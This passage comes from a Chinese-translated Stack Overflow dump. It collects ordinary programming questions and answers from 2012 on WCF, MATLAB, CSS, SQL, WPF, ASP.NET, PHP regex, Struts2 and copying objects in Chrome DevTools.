    <serviceHostingEnvironment multipleSiteBindingsEnabled="true" />
    <services>
      <service name="MyService.ServiceOne" behaviorConfiguration="servone">
        <endpoint address="" binding="basicHttpBinding" contract=" MyService.IServiceOne "/>
        <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange"/>
      </service>
    </services>

  </system.serviceModel>
  <system.webServer>
    <modules runAllManagedModulesForAllRequests="true"/>
  </system.webServer>
</configuration> 
```

浏览到 .svc 会显示带有示例代码的知名服务页面；

```
class Test
{
    static void Main()
    {
        ServiceOne client = new ServiceOne ();
        // Use the 'client' variable to call operations on the service.
        // Always close the client.
        client.Close();
    }
} 
```

客户端有一个名为 HandleRequest(string str) 的方法。所以在我的代码（C#）中有这样一行；

```
client.HandleRequest("blah"); 
```

该调用不会引发异常（我可以说是因为它们被捕获、处理并写入数据库）。这就像消息已发送但永远不会返回。当我在本地运行此服务（谁调用另一个）并将第二个留在远程服务器上时，一切正常。

显然，很难提供主办方的所有细节。不幸的是，我也无法访问 IIS 安装来模拟环境。因此，基于我能提供的少量信息，我并不期待深入的技术解决方案。但任何关于此设置与其他设置有何不同的评论都可能会有所帮助。

我真的很感激任何努力，谢谢。

* * *

编辑：

调用是这样的：

```
public bool Send(String str)
{
  bool result = false;
  BasicHttpBinding binding = new BasicHttpBinding();
  EndpointAddress ep = new EndpointAddress("http://www.mydomain.com/ServiceTwo.svc");
  client = new ServiceTwoClient(b, ep);
  //
  try
  {
    result = client.HandleRequest(str);
    client.Close();
    return result;
  }
  catch (Exception x)
  {
    Add2DbLog(x.Message);
    return false;
  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T14:15:54.257

您使用的域别名可能无法在服务器本地运行。登录到该服务器，启动 Web 浏览器，然后导航到代码中使用的服务 URL ( `http://www.mydomain.com/ServiceTwo.svc`)。确保您没有收到任何错误消息。

# matlab - Matlab GUI：使用变量引用现有对象句柄

> ID：10305322
> 
> 赞同：0
> 
> 时间：2012-04-24T20:12:01.920
> 
> 标签：matlab, matlab-guide

我目前正在为学校做我的 matlab 期末项目。在编程方面，我认为自己知识渊博且精通。但 Matlab 实在是太奇怪了。

> ***基本问题*** *（找到答案后意识到这一点）！*如何在调用 gui 句柄对象时使用变量而不使用变量的名称而不是值？
> 
> *换句话说：* **在字段名称中使用变量**（如果我知道这很简单，我就不会问了）

*我的项目*是构建一个古老的“战舰”游戏的简单再现。

**我的问题**：我目前有 5 个物体（轴）用于船舶部件。一次选择一个以将它们移动到另一个位置（网格）。**单击按钮后，***我可以*使用**setpixelposition**移动每个对象。

 **现在在按钮点击下，我有这样的东西

```
function btnPlaceShip_Callback(hObject, eventdata, handles) 

    %Store the current selected ship(passed from an onclick to a label) 
    ship = get(handles.lblSelectedShip,'string');

    %I have tried everything I could think of, but basically I want to achieve the
    %following

    setpixelposition(handles.ship, [0 250 50 250]) 
    %where the variable 'ship' contains the name of the object. 
```

换句话说，*var* **ship** = 'shipAircraftCarrier'，并且..

```
 setpixelposition(handles.shipAircraftCarrier, [0 250 50 250]) 
```

**作品！**（设置指定的特定船的位置）。但是，使用变量**ship**时，matlab 会按字面意思获取字符串，而不是获取其值。改用变量会非常方便！

如果有人有任何解决方案，我将不胜感激。我已经在网上搜索过，但也许我缺少对 Matlab GUI 内容的一些基本理解——matlab 帮助文档非常不具描述性，并没有太大帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T20:22:53.313

您可以使用该`eval`函数执行此操作，但您需要小心字符串注入：

```
setpixelposition(eval(strcat('handles.',ship)), [0 250 50 250]) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T22:44:21.887

您可以使用[动态字段](http://blogs.mathworks.com/pick/2008/08/20/advanced-matlab-dynamic-field-names/)名或[getfield](http://www.mathworks.ch/help/techdoc/ref/getfield.html)。`structs`在 Matlab和 Javascript中，使用标识符与字符串的字段索引非常相似`objects`。

MATLAB：

```
fromId = handles.shipAircraftCarrier; %identifier
fromString = handles.('shipAircraftCarrier'); %string 
```

Javascript：

```
var fromId = handles.shipAircraftCarrier; //identifier
var fromString = handles["shipAircraftCarrier"]; //string 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-25T11:45:25.857

正如其他人提到的那样，使用[动态字段名](http://www.mathworks.co.uk/help/techdoc/matlab_prog/br1v5cc-1.html)。虽然没有代码来测试它，但我相信只需在**船**周围放置括号即可将字符串替换为结构名称，因此

```
setpixelposition(handles.(ship), [0 250 50 250]) 
```

如果可能，尽量避免使用 eval()。**

# variables - 如何在 Expression Engine 中获取文章描述或摘录

> ID：10305323
> 
> 赞同：0
> 
> 时间：2012-04-24T20:12:02.787
> 
> 标签：variables, tags, expressionengine, article

我在 Expression Engine 中看到我可以使用 {embed:title} 和 {site_name} 变量，但现在我需要一个变量来提取文章本身的摘录或描述。有这样的变量/标签吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:26:01.500

ExpressionEngine 标记仅基于您自己定义的自定义字段。因此，在您的“文章”频道的字段组中，您将有一些字段，可能`{article_summary}`是 、`{article_body}`、`{article_image}`等。要显示您的摘要，只需`{article_summary}`在您的模板中使用。

我假设您可能来自 WordPress 之类的东西，[其中](http://expressionengine.com/user_guide/templates/globals/index.html)每条内容`the_content()`都有`the_excerpt()`......不是那样的。您可以定义用于每个通道的字段 - 您可以完全控制。`{title}``{entry_date}`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-10T02:13:31.750

这是您必须包含在 EE 模板中的实际代码。

```
{exp:channel:entries channel="article" limit="5" dynamic="no"}
        <div class="home_thumb">
        <h1><a href="{title_permalink="post/articles"}">{title}</a></h1>
            <div class="home_thumb_img">
                <a href="{title_permalink="post/articles"}"><img src="{article_image}"></a>
                {if article_content}
                    <p>{article_content}</p>
                {/if}
            </div>
        </div>
    {/exp:channel:entries} 
```

# python - PyList_SetItem 与 PyList_SETITEM

> ID：10305327
> 
> 赞同：8
> 
> 时间：2012-04-24T20:12:30.393
> 
> 标签：python, python-c-extension

据我所知，PyList_SetItem 和 PyList_SETITEM 之间的区别在于 PyList_SetItem 会降低它覆盖的列表项的引用计数，而 PyList_SETITEM 不会。

有什么理由不应该一直使用 PyList_SetItem 吗？或者如果我使用 PyList_SetItem 来初始化列表中的索引位置，我会遇到麻烦吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-24T20:43:19.563

`PyList_SET_ITEM`是一个不安全的宏，它基本上将一个对象粘贴到列表的内部指针数组中，而不进行任何绑定检查。`NULL`如果列表的第 th 位置有任何非`i`-，则会发生参考泄漏。`PyList_SET_ITEM`窃取对您放入列表中的对象的引用。`PyList_SetItem`也窃取了引用，但它会检查边界并删除可能位于第`i`th 位置的任何内容。经验法则`PyList_SET_ITEM`用于初始化您刚刚创建的列表，`PyList_SetItem`否则。在任何地方使用也完全安全`PyList_SetItem`；`PyList_SET_ITEM`基本上是一个速度黑客。

# html - 清除：在 2 列布局中左过于贪婪

> ID：10305329
> 
> 赞同：2
> 
> 时间：2012-04-24T20:12:37.587
> 
> 标签：html, css

示例：http: [//jsfiddle.net/YUhgb/](http://jsfiddle.net/YUhgb/)

**HTML**

```
<html>
    <body>
        <div class="left"></div>
        <div class="right">
            <div class="container">
                <div class="item"></div>
                <div class="item"></div>
                <div class="item"></div>
                <div class="item"></div>
                <div class="item"></div>
                <div class="item"></div>
                <div class="item"></div>
                <div class="item"></div>
                <div class="item"></div>
                <div class="item"></div>
            </div>
            <p>
                After Container
            </p>
        </div>
    </body>
</html> 
```

**CSS**

```
.left{
    float: left;
    width: 150px;
    height: 700px;
    background-color:red;
}
.right{
    margin-left: 160px;
    background-color:blue;
}
.container:after{
    content: "";
    height: 0;
    clear: both;
    display: block;
}
.item{
    float:left;
    width: 21%;
    margin-right: 1%;
    margin-bottom: 10px;
    height: 200px;
    background-color:green;
} 
```

问题是，如果左栏太长，浮动内容下方的内容会下降到左侧下方。在我的示例中，我希望文本`After Container`直接显示在绿色框下方。

如何应用 clear:left 使其仅影响右列？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:19:36.787

删除整个 CSS 块：

```
.container:after{
    content: "";
    height: 0;
    clear: both;
    display: block;
} 
```

...并添加：

```
.container { overflow:auto; } 
```

[http://jsfiddle.net/YUhgb/12/](http://jsfiddle.net/YUhgb/12/)

干杯

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:29:23.517

您可以通过将`display: table`和添加`width: 100%;`到具有`container`. 请参阅此处的工作示例：http: [//jsfiddle.net/skip405/YUhgb/15/](http://jsfiddle.net/skip405/YUhgb/15/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:18:28.647

你也可以浮动你的右栏吗？

修改示例：http: [//jsfiddle.net/YUhgb/9/](http://jsfiddle.net/YUhgb/9/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-24T20:43:01.673

我将其更改为`float:left;`，它显示了我想要的方式。`.left``position: absolute;`

更新代码：http: [//jsfiddle.net/YUhgb/17/](http://jsfiddle.net/YUhgb/17/)

# c - sem_unlink 权限被拒绝

> ID：10305330
> 
> 赞同：0
> 
> 时间：2012-04-24T20:12:39.453
> 
> 标签：c, macos, posix

我有一个学校作业，我们应该解决[读者-作家](http://en.wikipedia.org/wiki/Readers-writers_problem)问题。正如我之前发现的[sem_init 在 osx 机器上不受支持，](https://stackoverflow.com/questions/1413785/sem-init-on-os-x)所以我选择了 sem_open。但是，下面的代码无法按预期工作。

```
if(sem_open(sem_reader, O_CREAT, 1, 0600) == SEM_FAILED)
    perror("sem_reader"); 
```

信号量已创建，但是当我尝试使用以下代码取消链接时：

```
if(sem_unlink(sem_reader) != 0)
    perror("unlink_sem_reader"); 
```

我得到输出：

```
unlink_sem_reader: Permission denied 
```

我尝试使用 0700、0660 等权限，但我总是被拒绝权限。它们都包含在函数中，并且没有对它们执行任何操作。我不确定问题出在哪里。我的问题是：

**我是否错误地设置了权限或问题出在其他地方？**

编辑：在 Xcode / 10.7 中工作

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:20:58.413

我认为您切换了参数模式和`sem_open`.

# html - 如何使href 具有“已单击”样式

> ID：10305336
> 
> 赞同：-6
> 
> 时间：2012-04-24T20:13:18.973
> 
> 标签：html, css

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-24T20:14:40.507

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-24T20:16:00.017

是的，使用`:visited`伪类。

```
a:visited {
 color:#f00;
} 
```

[在MDN Docs](https://developer.mozilla.org/En/CSS/%3avisited)或[CSS Selectors Level 3 Specification](http://www.w3.org/TR/selectors/#the-link-pseudo-classes-link-and-visited)中阅读更多内容。

# sql-server-2008-r2 - CTE 中的错误“列名无效”

> ID：10305343
> 
> 赞同：0
> 
> 时间：2012-04-24T20:13:57.017
> 
> 标签：sql-server-2008-r2

我在使用列别名连接 cte 时遇到问题。`Invalid column name`就行了`RowNumber2 >= (t1.RowNumber - 20)`有人有什么建议吗？谢谢..

```
DECLARE @latestDate Date = dbo.LatestDateWithPricingVolCountOver4k()

;WITH AllSymbsAndDates AS
(
    SELECT 
        ROW_NUMBER() OVER (PARTITION BY Symbol ORDER BY TradingDate) AS RowNumber, 
        Symbol, TradingDate
    FROM tblSymbolsMain 
    CROSS JOIN tblTradingDays
    WHERE TradingDate <= @latestDate
),
SymbsDatesGrouped AS
(
    SELECT * FROM
    (
        SELECT 
            t1.Symbol, t1.TradingDate, t2.TradingDate AS TradingDate2, t1.RowNumber, 
            t2.RowNumber AS RowNumber2
        FROM AllSymbsAndDates t1 
        JOIN AllSymbsAndDates t2 ON t1.Symbol = t2.Symbol 
            AND RowNumber2 >= (t1.RowNumber - 20)
    ) t
)
SELECT 
    Symbol, TradingDate, TradingDate2, RowNumber, RowNumber2
FROM 
    SymbsDatesGrouped
ORDER BY 
     Symbol, TradingDate, TradingDate2 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T20:36:24.627

您不能在`WHERE`or`JOIN`子句中引用列别名 - 实际上，您可以从 SELECT 列表中引用别名的唯一子句是在`ORDER BY`（或在外部范围内，例如从子查询或 CTE 中选择）。

在这种情况下，解决方案非常简单。为什么不直接说：

```
 AND t2.RowNumber >= (t1.RowNumber - 20) 
```

?

# wpf - WPF 自定义字体无法正确呈现

> ID：10305346
> 
> 赞同：0
> 
> 时间：2012-04-24T20:14:15.387
> 
> 标签：wpf, fonts, expression-blend

我在 WPF 应用程序中使用字体“代码粗体”，字体是嵌入的，并且看起来在 Expression Blend 和 WPF 设计器中工作。

如此处所示： ![](../Images/294acdcb0f711a5c2e0f13ebeba6802c.png)

底部文本看起来更好地抗锯齿。这里可能有什么问题（除了字体大小不匹配）。

我已经将这些标签添加到控件和父窗口中：

```
 TextOptions.TextFormattingMode="Display"
    TextOptions.TextRenderingMode="ClearType" 
```

字体不是Cleartype是否必须这样做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T10:29:51.457

尝试在使用文本的元素上使用`SnapsToDevicePixels`or `UseLayoutRounding`（取决于 WPF 的版本），在所有这些设置之间，你应该得到你需要的东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-10-05T08:25:23.763

`UseLayoutRounding="True"`为我工作。我正在使用：**WPF .NET 4.5**。

我也尝试过`SnapsToDevicePixels="True"`，`RenderOptions.ClearTypeHint="Enabled"`但这些没有任何区别。

就我而言，我正在创建自定义控件。我在自定义控件的样式表中设置了 UseLayoutRounding。所有控件实例现在都可以正确呈现文本。

# c# - Windows 窗体按钮。启用无法视觉化

> ID：10305347
> 
> 赞同：3
> 
> 时间：2012-04-24T20:14:17.833
> 
> 标签：c#, winforms

我正在创建一个动态包装在另一个控件中的 Windows 窗体按钮。我遇到的问题是，当我设置按钮 Enabled 属性时，它仍然显示为好像已启用（未显示为灰色），但它不是可点击的。这使我相信我没有正确创建按钮或其他类似的东西。

这是我用来创建按钮的代码。

```
private System.Windows.Forms.Button CreateWindowsButton(SessionButtonTypes sessionButtonType)
{
        windowsButton = new System.Windows.Forms.Button()
        {
            Top = 3,
            Name = sessionButtonType.ToString(),
            Width = DeterminButtonWidth(guiElement),
            Height = 45,
            FlatStyle = FlatStyle.Flat,
            BackgroundImage = GUI.Instance.GUIImageElement(guiElement)
        };
        // set windows button flat border parameters
        windowsButton.FlatAppearance.BorderSize = 0;

        // for testing
        windowsButton.Enabled = false;
} 
```

[更新] 解决方案原来是将图像元素放入图像参数，而不是背景图像参数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:58:22.203

```
Remove `FlatStyle = FlatStyle.Flat`. 
```

Using`FlatStyle`强制控件具有预定义的样式，这将使按钮即使在`Enabled`等于 false 时也不会显示为灰色。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-10-17T09:35:53.507

我遇到了同样的问题，对我来说，解决方案是将平面样式从“标准”更改为“系统”

# asp.net - 处理程序处理时网站没有响应

> ID：10305348
> 
> 赞同：0
> 
> 时间：2012-04-24T20:14:30.507
> 
> 标签：asp.net, iis-7, windows-server-2008, threadpool, worker-process

在我的网站中，我有一个处理程序 (GetFile.ashx)，当它执行时，可以让您以给定的下载速率下载文件。处理程序需要执行，直到用户完成下载。问题是，当处理程序正在执行时，网站的其他页面（以及处理程序本身）无法访问，并且 IIS 会等到页面完成执行后再响应其他请求。我该如何解决？

我注意到的另一件事是我在 Amazon EC2 上的服务器上使用 IIS7 ...... IIS 怎么可能一次只能处理一个请求？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-16T13:33:35.093

我解决了。如果您使用实现了 IRequireSession 的页面（或处理程序），则会锁定其他页面的处理，因为它将对会话具有排他锁。解决方案是创建一个不需要会话状态的处理程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:48:40.200

只能同时执行有限数量的线程，可能是您已用完所有可用线程。您可以尝试使用`IHttpAsyncHandler`.

`IHttpAsyncHandler`在 MSDN上创建了一个演练，请参阅[演练：创建异步 HTTP 处理](http://msdn.microsoft.com/en-us/library/ms227433.aspx)程序。

编辑：您还可以尝试增加并发请求的数量，使用：

```
<system.web>
  <applicationPool maxConcurrentRequestsPerCPU="24" />
</system.web> 
```

请参阅 ASP.NET 论坛上的讨论，[http](http://forums.asp.net/t/1447626.aspx/1) ://forums.asp.net/t/1447626.aspx/1 。

# maple - 在 Maple 中绘制点

> ID：10305351
> 
> 赞同：2
> 
> 时间：2012-04-24T20:14:37.013
> 
> 标签：maple

我想在 Maple 中绘制一个 [2,-2,0] 。我正在尝试使用命令：

> pointplot3d（[2, -2, 0]，轴=正常，符号=交叉）

它不起作用（可能是因为 pointplot3d 用于点列表）。请帮忙。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-25T00:10:16.623

它对我有用，前提是我将它调用为`plots:-pointplot3d(...)`、 或`plots[pointplot3d](...)`，或者`pointplot3d(...)`仅在加载 plots 包之后调用它`with(plots)`。

默认颜色和尺寸可能不符合您的喜好。这是一个屏幕截图（Maple 15.01，Windows 7），

```
plots[pointplot3d]([[2, -2, 0]], axes=normal,
                symbolsize=20, symbol=cross, color=red); 
```

![在此处输入图像描述](../Images/df933bc29473a7841bb478f55a4b4243.png)

你提到它是一个单点。好吧，在 Maple 13.02、14.01、15.01 和 16.00 的所有版本中，它也可以用作`plots[pointplot3d]([[2, -2, 0]],...)`列表列表。

# c#-4.0 - 在 NAudio 中设置音量

> ID：10305359
> 
> 赞同：3
> 
> 时间：2012-04-24T20:15:10.947
> 
> 标签：c#-4.0, naudio

我`NAudio.dll`在 C# 应用程序中使用。我发现它`IWavePlayer`有这个属性 `Volume`，但它已经过时了。

```
 public interface IWavePlayer : IDisposable
    {
        [Obsolete("Not intending to keep supporting this going forward: set the volume on your input WaveProvider instead")]
        float Volume { get; set; }

       //..........................
    } 
```

那么我应该怎么做才能设置音量呢？有没有人有如何做到这一点的例子？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-25T08:48:40.123

的一些实现者`IWavePlayer`仍然有一个`Volume`属性（例如，`WaveOut`out `DirectSound`do），所以只保留对具体类而不是接口的引用。接口上的属性已过时，因为并非所有的实现者`IWavePlayer`都能够支持这一点。

在任何情况下，通常最好控制您传递给`IWavePlayer`自己的样本量。NAudio 中有许多类允许修改流音量，尤其是那些继承自`ISampleProvider`. 查看 NAudioDemo 源代码并查看如何实现音量修改作为示例。

# php - php preg_replace 受挫

> ID：10305362
> 
> 赞同：0
> 
> 时间：2012-04-24T20:15:30.087
> 
> 标签：php, regex, preg-replace

我不愿意问，但我无法弄清楚 php preg_replace 并忽略了一些刺痛。

```
$string = '2012042410000102'; 
```

$string 需要看起来像 _0424_102

显示数字不断变化，2012 年每年都在变化

我试过的：

```
^\d{4}[^\d{4}]10000[^\d{3}]$
^\d{4}[^\d]{4}10000[^\d]{3}$ 
```

任何帮助，将不胜感激。我知道这是一个菜鸟问题，但对于任何有帮助的人来说都很容易。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:20:24.170

您的第一个正则表达式正在寻找：

*   字符串的开始
*   四位数（年份）
*   ***任何不是数字也不是 { 或 } 的单个字符***
*   数字 10000
*   ***任何不是数字也不是 { 或 } 的单个字符***
*   字符串的结尾

您的第二个正则表达式正在寻找：

*   字符串的开始
*   四位数（年份）
*   ***任何四个非数字字符***
*   数字 10000
*   ***任何三个不是数字的字符***
*   字符串的结尾

您正在寻找的正则表达式是：

```
^\d{4}(\d{4})10000(\d{3})$ 
```

替换应该是：

```
_$1_$2 
```

此正则表达式查找：

*   字符串的开始
*   四位数（年份）
*   捕获四位数字（月份和日期）
*   数字 10000
*   捕获三位数字（`102`示例中的末尾）
*   字符串的结尾

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:23:19.943

尝试以下操作：

```
^\d{4}|10000(?=\d{3}$) 
```

这将匹配字符串中的前四位数字，或者如果在字符串结尾之前的“10000”之后有三位数字，则匹配字符串“10000”。

你会像这样使用它：

```
preg_replace('/^\d{4}|10000(?=\d{3}$)/', '_', $string); 
```

[http://codepad.org/itTgEGo4](http://codepad.org/itTgEGo4)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:21:39.937

只需使用简单的字符串函数：

```
$string = '2012042410000102';
$new = '_'.str_replace('10000', '_', substr($string, 4)); 
```

[http://codepad.org/elRSlCIP](http://codepad.org/elRSlCIP)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-24T20:28:54.960

如果它们总是在相同的字符位置，那么正则表达式似乎是不必要的。您可以使用子字符串来获取您想要的部分，例如

```
sprintf('_%s_%s', substr($string,4,4), substr($string,13)) 
```

或者

```
'_' . substr($string,4,4) . '_' . substr($string,13) 
```

# java - Struts2 验证消息不显示

> ID：10305364
> 
> 赞同：0
> 
> 时间：2012-04-24T20:15:43.877
> 
> 标签：java, struts2, validation

我这里有个奇怪的问题。我的 struts2`addFieldError(fieldName,ErrorMessage)`没有在我的 jsp 上显示错误

我也在扩展`ActionSupport`，并且在我的 Struts.xml 中我没有将我的主题设置为简单。

我的 ActionListener 是

```
package pebsms.actionBeans.UserActions;

import pebsms.business.UserBusiness.Impls.UserBusinessImpl;

import com.opensymphony.xwork2.ActionSupport;

public class LoginAction extends ActionSupport {

    UserBusinessImpl userBusiness;

    public String userPassword;
    public String userName;

    public String getUserName() {
        return userName;
    }

    public void setUserName(String userName) {
        this.userName = userName;
    }

    public String getUserPassword() {
        return userPassword;
    }

.   public String execute()
    {
        return SUCCESS;
    }

    public void validate()
    {
        if (getUserPassword().length() <= 0)
            addFieldError(userPassword, "Enter Password");
        if (getUserName().length() <= 0)
            addFieldError(userName, "Enter UserName");
        if (!userBusiness.authenticateUser(userName, userPassword))
            addActionError("User authentication failed");**
    }
} 
```

我的 Struts.xml 是

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE struts PUBLIC
    "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
    "http://struts.apache.org/dtds/struts-2.0.dtd">

<struts>
    <constant name="struts.devMode" value="true" />

    <package name="default" namespace="/" extends="struts-default" >
        <action name="Login" >
            <result>/pages/LoginScreen/Login.jsp</result>
        </action>

        <action name="LoginAction" class="userAction">
                    <result name="input">/pages/LoginScreen/Login.jsp</result>
            </action>
    </package>
</struts> 
```

`addFieldError`即使在 validate() 中调用了该方法，它也不会像它应该自动那样在我的 jsp 上显示错误消息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-21T21:54:08.577

您的 addFieldError 方法不正确。应该：

```
 addFieldError("userName", "Enter UserName"); 
```

在 jsp 上使用元素的“名称”属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-17T13:51:27.970

如果您在 struts 标签 textfield 中使用简单的主题。`<s:textfield theme="simple" />`然后删除它。通常错误消息被夹在两行之间。尝试这个。并给我你的答复。

# javascript - Javascript / Chrome - 如何从 webkit 检查器复制对象作为代码

> ID：10305365
> 
> 赞同：615
> 
> 时间：2012-04-24T20:15:44.060
> 
> 标签：javascript, google-chrome, object, webkit

我在我的 javascript 中执行 console.log 语句以记录 javascript 对象。我想知道是否有办法，一旦完成 - 将该对象复制为 javascript 代码。我想要做的是将使用 ajax 创建的对象转换为将 xml 提要解析为静态 javascript 对象，以便文件可以在本地运行，而无需服务器。我在 chrome 检查器窗口中包含了该对象的屏幕截图，因此您可以看到我正在尝试做什么。![在此处输入图像描述](../Images/21eb52e741312afac4c5ad7fab30fb94.png)

* * *

## 回答 #1

> 赞同：1566
> 
> 时间：2014-08-05T13:54:16.613

1.  右键单击 Chrome 控制台中的对象，然后`Store as Global Variable`从上下文菜单中选择。它将返回类似于`temp1`变量名的内容。

2.  Chrome 也有一个`copy()`方法，所以`copy(temp1)`在控制台中应该将该对象复制到剪贴板。

[![在 Chrome DevTools 中复制 Javascript 对象](../Images/2f0595ad93513b3b3d40f02c023231a4.png)](https://thumbs.gfycat.com/JadedUnsteadyFennecfox-size_restricted.gif)

**关于递归对象的注意事项：**如果您尝试复制递归对象，您将获得`[object Object]`. 出路是尝试`copy(JSON.stringify(temp1))`，该对象将作为有效的 JSON 完全复制到剪贴板，因此您可以使用多种资源之一对其进行格式化。

如果您收到`Uncaught TypeError: Converting circular structure to JSON`消息，您可以使用`JSON.stringify`的第二个参数（它是一个过滤器函数）来过滤掉有问题的循环属性。有关更多详细信息，请参阅此[Stack Overflow 答案](https://stackoverflow.com/a/12659424/622287)。

* * *

## 回答 #2

> 赞同：70
> 
> 时间：2012-04-24T20:19:20.147

在 Chrome 89 或更高版本中，您只需右键单击控制台中的对象并选择`Copy Object`( [ref](https://developer.chrome.com/blog/new-in-devtools-89/#copy-object) )。这也适用于 Chrome 开发者工具中的其他一些地方，例如在调试时或在网络请求的响应选项卡中。

其他选项是按[`copy`](https://developer.chrome.com/docs/devtools/console/utilities/#copy-function)原样使用命令：

```
var x = { a: 1, b: 2 };
copy(x); 
```

* * *

[原始答案](https://stackoverflow.com/revisions/10305408/1)

* * *

## 回答 #3

> 赞同：45
> 
> 时间：2014-05-21T07:40:41.053

您可以使用**copy(JSON.stringify(Object_Name)); 将对象复制到剪贴板；**在控制台中。

例如：- 在控制台中复制并粘贴以下代码，然后按 ENTER。现在，尝试将其粘贴（Windows 为 CTRL+V，mac 为 CMD+V）粘贴到其他位置，您将得到 *{"name":"Daniel","age":25}*

```
var profile = {
    name: "Daniel",
    age: 25
};

copy(JSON.stringify(profile)); 
```

* * *

## 回答 #4

> 赞同：27
> 
> 时间：2014-06-12T19:37:30.740

您现在可以通过右键单击对象并选择“存储为全局变量”在 Chrome 中完成此操作：[http ://www.youtube.com/watch?v=qALFiTlVWdg](http://www.youtube.com/watch?v=qALFiTlVWdg)

[![在此处输入图像描述](../Images/6d77291e1a6c631c947be673e2cf90b7.png)](https://i.stack.imgur.com/U46xz.gif)

* * *

## 回答 #5

> 赞同：14
> 
> 时间：2015-06-09T00:57:51.937

请按照以下步骤操作：

1.  从代码中输出带有 console.log 的对象，如下所示：console.log(myObject)
2.  右键单击对象，然后单击“存储为全局对象”。此时 Chrome 会打印变量的名称。假设它被称为“temp1”。
3.  在控制台中，键入：`JSON.stringify(temp1)`。
4.  此时，您将看到整个 JSON 对象作为可以复制/粘贴的字符串。
5.  此时，您可以使用[http://www.jsoneditoronline.org/](http://www.jsoneditoronline.org/)等在线工具来美化您的字符串。

* * *

## 回答 #6

> 赞同：12
> 
> 时间：2014-09-12T16:51:25.543

如果您已通过请求发送对象，则可以从 Chrome -> 网络选项卡中复制它。

请求有效负载 - > 查看源代码

![在此处输入图像描述](../Images/c5cd5c56396df813615222418d1fefa0.png)

![在此处输入图像描述](../Images/978f197a193db4081dcd68053656054c.png)

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2021-03-04T08:12:41.033

## 更新 - Chrome 89

右键单击->复制对象

来源：（[https://developers.google.com/web/updates/2021/01/devtools?utm_source=devtools](https://developers.google.com/web/updates/2021/01/devtools?utm_source=devtools)）

[![在此处输入图像描述](../Images/26dc79c3998c992e6fbb233368eab129.png)](https://i.stack.imgur.com/pitxr.png)

> 也来自调试器

[![在此处输入图像描述](../Images/d74c1ae5c5990ac06dbad0169d89c418.png)](https://i.stack.imgur.com/EeCIk.png)

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2021-06-06T18:07:43.007

您可以将对象作为字符串进行控制台

```
var objToString = JSON.stringify(obj)
console.log(objToString ); 
```

然后在 Notepad ++ 之类的编辑器中粘贴 de 输出，然后使用插件格式

[JS格式](https://i.stack.imgur.com/8vXxp.png)

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2019-07-23T08:46:50.773

[Right click on data which you want to store](https://i.stack.imgur.com/lHxap.png)

*   Firstly, Right click on data which you want to store -> select "Store as global variable" And the new temp variable appear like bellow: (temp3 variable): [New temp variable appear in console](https://i.stack.imgur.com/i60Ge.png)
*   Second use command copy(temp_variable_name) like picture: [enter image description here](https://i.stack.imgur.com/sM3Zh.png) After that, you can paste data to anywhere you want. hope useful/

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2019-07-12T06:07:05.343

这应该通过省略递归`Window`和对象来帮助字符串化深层`Node`对象。

```
function stringifyObject(e) {
  const obj = {};
  for (let k in e) {
    obj[k] = e[k];
  }

  return JSON.stringify(obj, (k, v) => {
    if (v instanceof Node) return 'Node';
    if (v instanceof Window) return 'Window';
    return v;
  }, ' ');
} 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2021-12-22T11:29:44.487

这实际上帮助我解决了我的问题。但对于我正在做的事情，它是有效的。

我正在测试的设备使用 safari 调试工具，我永远无法像在 Chrome 中那样复制对象，只需右键单击并复制对象。

尝试了 JSON.stringify 并将内容粘贴到[https://beautifier.io](https://beautifier.io)但随后必须尝试重新格式化它。

我最终使用了本地存储和复制方法。

在您的代码中使用。

```
localStorage.setItem('dataCopy', JSON.stringify(data)); 
```

然后只需将其粘贴到控制台中，然后单击 Enter。

```
copy(JSON.parse(window.localStorage.dataCopy)) 
```

然后，您在剪贴板中有您的对象数组。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2020-06-04T14:17:05.093

将此添加到您的控制台并执行

```
copy(JSON.stringify(foo)); 
```

这会将您的 JSON 复制到剪贴板

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2018-04-09T01:22:26.673

所以，。我有这个问题，。除了我得到 [object object]

我相信你可以用递归来做到这一点，但这对我有用：

这是我在控制台中所做的：

```
var object_that_is_not_shallow = $("all_obects_with_this_class_name");
var str = '';
object_that_is_not_shallow.map(function(_,e){
